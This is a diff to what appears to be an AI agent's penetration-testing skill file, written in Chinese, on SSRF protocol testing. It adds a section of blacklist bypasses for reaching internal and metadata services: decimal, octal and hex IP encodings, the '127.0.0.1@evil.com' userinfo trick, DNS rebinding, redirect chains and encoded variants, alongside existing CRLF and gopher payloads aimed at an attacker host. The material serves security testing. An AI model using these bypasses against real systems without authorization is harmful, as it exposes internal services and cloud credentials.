@@ -1,6 +1,7 @@
 ---
 name: 'ssrf-protocol-matrix'
 description: 'SSRF 协议测试矩阵：file/http/netdoc/gopher 逐个试 → 能力分级 L1-L6 → 关键问题检查表'
+whenToUse: '目标有 SSRF 且内网地址/元数据被过滤时：先跑协议矩阵定能力，再按绕过节过一遍黑名单。'
 metadata: { domain: web, tier: T1 }
 ---
 > 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
@@ -38,6 +39,18 @@ ftp://                       # FTP — 可能读取/写入
 | L5 | CRLF 注入 | `http://AttackerIP/%0d%0aInjected:yes` — 注意 Java 会 URL 编码 CRLF |
 | L6 | Gopher | `gopher://AttackerIP/_DATA` 发送原始 TCP |
 
+## 黑名单/白名单绕过（实战）
+
+> Nimbus 实战：字符串黑名单被十进制 IP 2130706433 绕过直达元数据服务；"floci" 子串整 URL 匹配拦截；重定向不被跟随但会被检查
+
+- **十进制 IP**：`2130706433` = 127.0.0.1（`http://2130706433/` 绕过只过滤 `127.0.0.1`/`localhost` 的黑名单，直达元数据服务）
+- **八进制 / 十六进制 IP**：`0177.0.0.1`（八进制）、`0x7f000001`（十六进制）→ 127.0.0.1
+- **`127.1` 缩写**：IP 简写，`127.1` 解析为 127.0.0.1
+- **URL userinfo `@`**：`http://127.0.0.1@evil.com/` — 解析器取 `@` 后为真实目标，黑名单只匹配 host 前缀则被绕过
+- **DNS rebinding**：域名首次解析为公网 IP（过白名单），后续解析为内网 IP（打内网）
+- **302 重定向链**：外部域名 → 302 → 内网地址；部分实现跟随重定向但不复查黑名单
+- **URL 编码变体**：`%31%32%37.0.0.1`、`127.0.0.1%00`、双重编码、混合大小写十六进制
+
 ## 3. 每个协议的关键问题
 
 ```
@@ -54,6 +67,8 @@ ftp://                       # FTP — 可能读取/写入
 ```
 
 ## 4. DevArea 实测结果
+
+（DevArea/Apache CXF 环境实测）
 
 | 协议 | 结果 | 备注 |
 |------|------|------|
